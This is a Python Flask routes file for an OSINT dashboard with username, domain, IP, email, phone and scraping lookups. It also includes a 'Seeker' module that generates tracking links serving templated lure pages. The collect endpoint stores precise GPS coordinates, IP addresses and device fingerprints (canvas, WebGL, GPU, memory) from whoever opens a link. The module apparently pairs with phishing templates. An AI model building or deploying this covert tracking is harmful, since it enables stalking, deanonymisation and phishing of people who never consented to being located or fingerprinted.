from app import app, db
from flask import render_template, request, jsonify, flash, redirect, url_for, session, Response
from models import SearchHistory, Analytics, PhishingTemplate, SeekerSession, SeekerLocation, SeekerDevice
from osint_tools import OSINTTools
from web_scraper import get_website_text_content
from seeker_tool import SeekerTool
from datetime import datetime, date
import json
import logging
import secrets

osint = OSINTTools()
seeker = SeekerTool()

@app.route('/')
def index():
    """Dashboard with overview of tools and recent activity"""
    recent_searches = db.session.query(SearchHistory).order_by(SearchHistory.timestamp.desc()).limit(5).all()
    
    # Get today's analytics
    today = date.today()
    today_stats = db.session.query(Analytics).filter_by(date=today).all()
    total_today = sum(stat.count for stat in today_stats)
    
    return render_template('index.html', 
                         recent_searches=recent_searches,
                         total_searches_today=total_today)

@app.route('/username_search', methods=['GET', 'POST'])
def username_search():
    """Username search across multiple platforms"""
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        if not username:
            flash('Please enter a username to search', 'error')
            return render_template('username_search.html')
        
        try:
            # Perform username search
            results = osint.search_username(username)
            
            # Save to database
            search_record = SearchHistory(
                search_type='username',
                query=username,
                results=json.dumps(results),
                ip_address=request.remote_addr,
                user_agent=request.headers.get('User-Agent')
            )
            db.session.add(search_record)
            
            # Update analytics
            update_analytics('username')
            
            db.session.commit()
            
            return render_template('username_search.html', 
                                 results=results, 
                                 username=username)
            
        except Exception as e:
            logging.error(f"Username search error: {str(e)}")
            flash(f'Error performing search: {str(e)}', 'error')
    
    return render_template('username_search.html')

@app.route('/domain_analysis', methods=['GET', 'POST'])
def domain_analysis():
    """Domain analysis and investigation"""
    if request.method == 'POST':
        domain = request.form.get('domain', '').strip()
        if not domain:
            flash('Please enter a domain to analyze', 'error')
            return render_template('domain_analysis.html')
        
        try:
            # Perform domain analysis
            results = osint.analyze_domain(domain)
            
            # Save to database
            search_record = SearchHistory(
                search_type='domain',
                query=domain,
                results=json.dumps(results),
                ip_address=request.remote_addr,
                user_agent=request.headers.get('User-Agent')
            )
            db.session.add(search_record)
            
            # Update analytics
            update_analytics('domain')
            
            db.session.commit()
            
            return render_template('domain_analysis.html', 
                                 results=results, 
                                 domain=domain)
            
        except Exception as e:
            logging.error(f"Domain analysis error: {str(e)}")
            flash(f'Error analyzing domain: {str(e)}', 'error')
    
    return render_template('domain_analysis.html')

@app.route('/ip_investigation', methods=['GET', 'POST'])
def ip_investigation():
    """IP address investigation and geolocation"""
    if request.method == 'POST':
        ip_address = request.form.get('ip_address', '').strip()
        if not ip_address:
            flash('Please enter an IP address to investigate', 'error')
            return render_template('ip_investigation.html')
        
        try:
            # Perform IP investigation
            results = osint.investigate_ip(ip_address)
            
            # Save to database
            search_record = SearchHistory(
                search_type='ip',
                query=ip_address,
                results=json.dumps(results),
                ip_address=request.remote_addr,
                user_agent=request.headers.get('User-Agent')
            )
            db.session.add(search_record)
            
            # Update analytics
            update_analytics('ip')
            
            db.session.commit()
            
            return render_template('ip_investigation.html', 
                                 results=results, 
                                 ip_address=ip_address)
            
        except Exception as e:
            logging.error(f"IP investigation error: {str(e)}")
            flash(f'Error investigating IP: {str(e)}', 'error')
    
    return render_template('ip_investigation.html')

@app.route('/email_phone_lookup', methods=['GET', 'POST'])
def email_phone_lookup():
    """Email and phone number lookup"""
    if request.method == 'POST':
        query = request.form.get('query', '').strip()
        lookup_type = request.form.get('type', 'email')
        
        if not query:
            flash('Please enter an email or phone number to lookup', 'error')
            return render_template('email_phone_lookup.html')
        
        try:
            if lookup_type == 'email':
                results = osint.lookup_email(query)
            else:
                results = osint.lookup_phone(query)
            
            # Save to database
            search_record = SearchHistory(
                search_type=lookup_type,
                query=query,
                results=json.dumps(results),
                ip_address=request.remote_addr,
                user_agent=request.headers.get('User-Agent')
            )
            db.session.add(search_record)
            
            # Update analytics
            update_analytics(lookup_type)
            
            db.session.commit()
            
            return render_template('email_phone_lookup.html', 
                                 results=results, 
                                 query=query,
                                 lookup_type=lookup_type)
            
        except Exception as e:
            logging.error(f"Email/Phone lookup error: {str(e)}")
            flash(f'Error performing lookup: {str(e)}', 'error')
    
    return render_template('email_phone_lookup.html')

@app.route('/web_scraper', methods=['GET', 'POST'])
def web_scraper():
    """Web scraping utility"""
    if request.method == 'POST':
        url = request.form.get('url', '').strip()
        if not url:
            flash('Please enter a URL to scrape', 'error')
            return render_template('web_scraper.html')
        
        try:
            # Perform web scraping
            content = get_website_text_content(url)
            
            results = {
                'url': url,
                'content': content,
                'timestamp': datetime.utcnow().isoformat()
            }
            
            # Save to database
            search_record = SearchHistory(
                search_type='webscrape',
                query=url,
                results=json.dumps(results),
                ip_address=request.remote_addr,
                user_agent=request.headers.get('User-Agent')
            )
            db.session.add(search_record)
            
            # Update analytics
            update_analytics('webscrape')
            
            db.session.commit()
            
            return render_template('web_scraper.html', 
                                 results=results, 
                                 url=url)
            
        except Exception as e:
            logging.error(f"Web scraping error: {str(e)}")
            flash(f'Error scraping website: {str(e)}', 'error')
    
    return render_template('web_scraper.html')

@app.route('/analytics')
def analytics():
    """Analytics dashboard"""
    # Get search statistics
    total_searches = db.session.query(SearchHistory).count()
    
    # Get searches by type
    search_types = db.session.query(
        SearchHistory.search_type,
        db.func.count(SearchHistory.id).label('count')
    ).group_by(SearchHistory.search_type).all()
    
    # Get recent activity (last 7 days)
    from datetime import timedelta
    week_ago = datetime.utcnow() - timedelta(days=7)
    recent_activity = db.session.query(
        db.func.date(SearchHistory.timestamp).label('date'),
        db.func.count(SearchHistory.id).label('count')
    ).filter(
        SearchHistory.timestamp >= week_ago
    ).group_by(
        db.func.date(SearchHistory.timestamp)
    ).order_by('date').all()
    
    return render_template('analytics.html',
                         total_searches=total_searches,
                         search_types=search_types,
                         recent_activity=recent_activity)

@app.route('/history')
def history():
    """Search history"""
    page = request.args.get('page', 1, type=int)
    search_type = request.args.get('type', '')
    
    query = db.session.query(SearchHistory)
    
    if search_type:
        query = query.filter_by(search_type=search_type)
    
    searches = query.order_by(SearchHistory.timestamp.desc()).paginate(
        page=page, per_page=20, error_out=False
    )
    
    return render_template('history.html', searches=searches, search_type=search_type)

def update_analytics(search_type):
    """Update daily analytics"""
    today = date.today()
    
    # Try to get existing record
    analytics_record = db.session.query(Analytics).filter_by(
        date=today,
        search_type=search_type
    ).first()
    
    if analytics_record:
        analytics_record.count += 1
    else:
        analytics_record = Analytics(
            date=today,
            search_type=search_type,
            count=1
        )
        db.session.add(analytics_record)

# =============================================================================
# SEEKER GEOLOCATION TOOL ROUTES
# =============================================================================

@app.route('/seeker')
def seeker_dashboard():
    """Seeker geolocation tool dashboard"""
    # Get active sessions from database
    active_sessions = db.session.query(SeekerSession).filter_by(status='active').all()
    recent_sessions = db.session.query(SeekerSession).order_by(SeekerSession.created_at.desc()).limit(10).all()
    
    # Calculate stats
    total_sessions = db.session.query(SeekerSession).count()
    total_visits = db.session.query(SeekerSession).with_entities(db.func.sum(SeekerSession.visits)).scalar() or 0
    total_locations = db.session.query(SeekerLocation).count()
    
    stats = {
        'active_sessions': len(active_sessions),
        'total_sessions': total_sessions,
        'total_visits': total_visits,
        'total_locations': total_locations
    }
    
    templates = seeker.get_available_templates()
    
    return render_template('seeker_dashboard.html', 
                         sessions=recent_sessions, 
                         stats=stats, 
                         templates=templates)

@app.route('/seeker/create', methods=['POST'])
def create_seeker_session():
    """Create a new Seeker session"""
    try:
        session_name = request.form.get('session_name', '').strip()
        template_name = request.form.get('template_name', '').strip()
        
        if not session_name or not template_name:
            flash('Session name and template are required', 'error')
            return redirect(url_for('seeker_dashboard'))
        
        # Generate session ID
        session_id = secrets.token_urlsafe(16)
        
        # Create database record
        new_session = SeekerSession(
            id=session_id,
            name=session_name,
            template_name=template_name,
            status='active'
        )
        
        db.session.add(new_session)
        db.session.commit()
        
        # Generate tracking link
        base_url = request.host_url
        tracking_link = f"{base_url}seeker/track/{session_id}/{template_name}"
        
        flash(f'Session created successfully! Tracking link: {tracking_link}', 'success')
        return redirect(url_for('seeker_session_detail', session_id=session_id))
        
    except Exception as e:
        db.session.rollback()
        flash(f'Error creating session: {str(e)}', 'error')
        return redirect(url_for('seeker_dashboard'))

@app.route('/seeker/session/<session_id>')
def seeker_session_detail(session_id):
    """View details of a specific Seeker session"""
    session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
    if not session_obj:
        flash('Session not found', 'error')
        return redirect(url_for('seeker_dashboard'))
    
    locations = db.session.query(SeekerLocation).filter_by(session_id=session_id).order_by(SeekerLocation.timestamp.desc()).all()
    devices = db.session.query(SeekerDevice).filter_by(session_id=session_id).order_by(SeekerDevice.timestamp.desc()).all()
    
    tracking_link = f"{request.host_url}seeker/track/{session_id}/{session_obj.template_name}"
    
    return render_template('seeker_session.html', 
                         session=session_obj, 
                         locations=locations, 
                         devices=devices,
                         tracking_link=tracking_link)

@app.route('/seeker/track/<session_id>/<template_name>')
def seeker_tracking_page(session_id, template_name):
    """Serve the tracking page for a specific session and template"""
    session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
    if not session_obj or session_obj.status != 'active':
        return "Session not found or inactive", 404
    
    # Get template HTML - use basic template for now
    template_html = seeker.get_basic_template(template_name)
    
    # Replace placeholders in template
    template_html = template_html.replace('/collect', f'/seeker/collect/{session_id}')
    
    return Response(template_html, mimetype='text/html')

@app.route('/seeker/collect/<session_id>', methods=['POST'])
def collect_seeker_data(session_id):
    """Collect location and device data from tracking page"""
    try:
        session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
        if not session_obj:
            return jsonify({'error': 'Session not found'}), 404
        
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No data received'}), 400
        
        # Update visit count
        session_obj.visits += 1
        
        # Save location data if provided
        location_data = data.get('location')
        if location_data:
            location_record = SeekerLocation(
                session_id=session_id,
                latitude=location_data.get('latitude'),
                longitude=location_data.get('longitude'),
                accuracy=location_data.get('accuracy'),
                altitude=location_data.get('altitude'),
                speed=location_data.get('speed'),
                heading=location_data.get('heading'),
                ip_address=request.remote_addr
            )
            db.session.add(location_record)
        
        # Save device data if provided
        device_data = data.get('device')
        if device_data:
            device_record = SeekerDevice(
                session_id=session_id,
                user_agent=device_data.get('userAgent'),
                screen_resolution=device_data.get('screen'),
                timezone=device_data.get('timezone'),
                language=device_data.get('language'),
                platform=device_data.get('platform'),
                cpu_cores=device_data.get('cores'),
                memory=device_data.get('memory'),
                gpu=device_data.get('gpu'),
                canvas_fingerprint=device_data.get('canvas'),
                webgl_fingerprint=device_data.get('webgl'),
                ip_address=request.remote_addr
            )
            db.session.add(device_record)
        
        db.session.commit()
        return jsonify({'success': True}), 200
        
    except Exception as e:
        db.session.rollback()
        logging.error(f'Error collecting seeker data: {str(e)}')
        return jsonify({'error': 'Internal server error'}), 500

@app.route('/seeker/session/<session_id>/toggle')
def toggle_seeker_session(session_id):
    """Toggle session active/inactive status"""
    session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
    if not session_obj:
        flash('Session not found', 'error')
        return redirect(url_for('seeker_dashboard'))
    
    session_obj.status = 'inactive' if session_obj.status == 'active' else 'active'
    db.session.commit()
    
    status_text = 'activated' if session_obj.status == 'active' else 'deactivated'
    flash(f'Session {status_text} successfully', 'success')
    return redirect(url_for('seeker_session_detail', session_id=session_id))

@app.route('/seeker/session/<session_id>/delete')
def delete_seeker_session(session_id):
    """Delete a Seeker session and all its data"""
    session_obj = db.session.query(SeekerSession).filter_by(id=session_id).first()
    if not session_obj:
        flash('Session not found', 'error')
        return redirect(url_for('seeker_dashboard'))
    
    # Delete the session (cascade will delete related records)
    db.session.delete(session_obj)
    db.session.commit()
    
    flash('Session deleted successfully', 'success')
    return redirect(url_for('seeker_dashboard'))

@app.errorhandler(404)
def not_found_error(error):
    return render_template('base.html'), 404

@app.errorhandler(500)
def internal_error(error):
    db.session.rollback()
    return render_template('base.html'), 500
